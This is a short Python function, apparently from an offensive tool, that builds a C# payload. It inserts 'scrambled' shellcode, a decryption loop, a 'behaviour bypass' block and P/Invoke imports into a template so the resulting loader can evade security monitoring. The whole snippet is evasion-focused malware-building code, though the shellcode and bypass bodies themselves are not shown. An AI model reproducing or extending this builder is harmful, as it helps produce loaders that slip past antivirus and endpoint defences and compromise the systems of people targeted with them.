
def generate_csharp_payload(template,shellcode,decryption_routine,behaviour_bypass,markers):
    # Adding the decryption loop
    template.insert(markers["decryption_loop"],decryption_routine)

    # Injecting the scrambled Payload
    template.insert(markers["payload"],shellcode)

    # Adding the behaviour bypass
    template.insert(markers["behaviour_bypass"],behaviour_bypass["code"])

    # Adding the pinvoke lines
    template.insert(markers["pinvoke"],behaviour_bypass["pinvoke_imports"])
    return template
